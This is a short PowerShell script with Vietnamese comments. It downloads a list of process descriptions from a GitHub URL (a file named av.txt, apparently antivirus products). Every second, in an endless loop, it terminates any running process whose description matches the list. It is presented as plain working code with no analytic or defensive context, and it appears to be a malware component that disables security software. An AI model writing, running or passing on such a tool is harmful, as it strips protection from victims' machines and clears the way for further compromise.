# Đọc nội dung từ URL và lưu vào biến
$url = "https://raw.githubusercontent.com/43a1723/test/main/output/av.txt"
$processDescriptions = Invoke-RestMethod -Uri $url

# Tạo vòng lặp vô tận
while ($true) {
    foreach ($description in $processDescriptions) {
        # Lấy danh sách các tiến trình và mô tả của chúng
        Get-WmiObject Win32_Process | Where-Object { $_.Description -like "*$description*" } | ForEach-Object {
            try {
                # Dừng tiến trình
                $_.Terminate()
                Write-Output "Terminated process: $($_.Name) with description containing '$description'"
            } catch {
                Write-Output "Failed to terminate process: $($_.Name) with description containing '$description'"
            }
        }
    }
    
    # Chờ 1 giây trước khi lặp lại
    Start-Sleep -Seconds 1
}
